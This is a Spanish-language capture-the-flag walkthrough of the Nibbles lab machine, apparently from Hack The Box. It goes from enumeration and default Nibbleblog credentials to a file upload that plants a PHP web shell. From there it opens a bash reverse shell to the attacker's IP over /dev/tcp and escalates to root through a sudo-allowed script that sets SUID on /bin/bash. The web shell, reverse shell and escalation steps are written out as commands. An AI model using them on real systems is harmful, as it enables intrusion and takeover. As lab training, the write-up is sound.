## Summary

Tags: 

- IP -> 10.10.10.75
- Ports -> TCP (22,80), UDP (idk)
- OS ->  Linux
- Services & Applications
    - 22 -> OpenSSH 7.2p2  
    - 80 -> Apache httpd 2.4.18 

## Launchpad

-   **Launchpad**: [https://launchpad.net/ubuntu](https://launchpad.net/ubuntu)

Buscaremos con el codename **OpenSSH 7.2p2 ubuntu 4ubuntu2.2 launchpad** y veremos que version de Linux es: Xenial
Buscaremos con el codename **apache httpd 2.4.18 launchpad** y veremos que version de Linux es: Xenial
## Recon


```bash
❯ whatweb ❮http://IP❯                  # Nos dara una breve descripcion del gestor de contenidos del puerto 80

	# Mirar la jQuery
	# Servidor Web
	
- Tiene PHP, jQuery 2.1.0 que esta desactualizado. La ultima version de jQuery es 3.6.3
- Nibbles es un CMS 
```

```bash 
❯ wfuzz -c --hc=404 -t 200 -w /usr/share/Seclists/Discovery/Web-content/directory-list-2.3-medium.txt http://10.10.10.75/nibbleblog/FUZZ

- Encontramos un panel de autenticacion 
	- Las credenciales por defecto estan en internet admin:nibbles

❯ wfuzz -c --hc=404 -t 200 -w /usr/share/Seclists/Discovery/Web-content/directory-list-2.3-medium.txt http://10.10.10.75/nibbleblog/FUZZ.php

- Encontramos un archivo 'php' llamado 'install.php' en el se encuentra la version de Nibbles que es 4.0.3 vulnerable a Arbitrary File Upload 
```

```bash 
❯ searchsploit -x 15265.txt                 # Para mirar el contenido del exploit que encontramos para 'nibbleblog'
	# x = examin 
- Miramos que existe una ruta en el exploit de la pagina web en donde podemos subir archivos, en la cual subiremos el siguiente archivo php con una 'revershell'
```

```bash 
nano cmd.php
	<?p 
		echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
	 ?>

- La ruta en la url en donde los guarda es '/nibbleblog/content/private/pluggis/my_images'
```

## User

Ahora podemos ejecutar comando remotos colocando esto al final de la url **?cmd=whoami**

```bash 
❯ nc -nlvp 443             # Modo escucha para recibir la revershell 
```

En la url escribimos lo siguiente /image.php?cmd=**bash -c "bash -i >& /dev/tcp/10.10.14.17/443 0>&1"** Esto nos dará la revershell a nuestra IP
Colocamos lo anterior en url-encode para que nos marque algun error:
- **bash -c "bash -i >%26 /dev/tcp/10.10.14.17/443 0>%261"** 

Y ya entramos a la maquina victima. Por lo que ahora hacemos tratamiento de la tty
-
Tratamiento de la consola Linux cuando entras a una maquina victima
 **Script /dev/null -c bash** Nos sales que esto no se puede hacer, por lo que hacemos lo siguiente
 **Ctrl + z**
 **stty raw -echo; fg**
 **reset xterm**

Despues cambiamos esto para poder hacer Ctrl+ l y Ctrl + c
**echo $SHELL** Para ver la ruta de shell y ver que valor tiene **/usr/bin/nologin**
**export SHELL=bash** Hacemos que shell ahora valga bash
**export TERM=xterm**

Ahora para modificar las dimensiones de nano debemos hacer lo siguiente.
**stty size** Con este comando podemos ver las dimensiones de la consola nano de 24 80 por lo que debemos de modificar ese valor a este
**stty rows 51 columns 189** Modificamos las dimensiones de la consola nano

-
Despues buscamos la primer flag -> user.txt

## Root

- **sudo -l** Tenemos un privilegio a nivel de sudoers
-Nos debemos de crear una ruta y un archivo con extension .sh que el cual al momento de escribirle algo lo podremos ejecutar como root y así ganaremos acceso. 

nano monitor.sh 
	#!/bin/bash
	chmod u+s /bin/bash

Con este script queremos que nos ejecute este script con un permiso suid a la bash

- **sudo -u root /home/nibbler/personal/stuff/monitor.sh** Haremos que root no ejecute ese script ya que solo ahi podemos ejecutar con ese privilegio de root y nos dara una S -> privilegio suid 
- **bash -p**  (p=priviledge) y que me de la bash de forma temporal como root y listo 
Ahora solo queda buscar la flag root.txt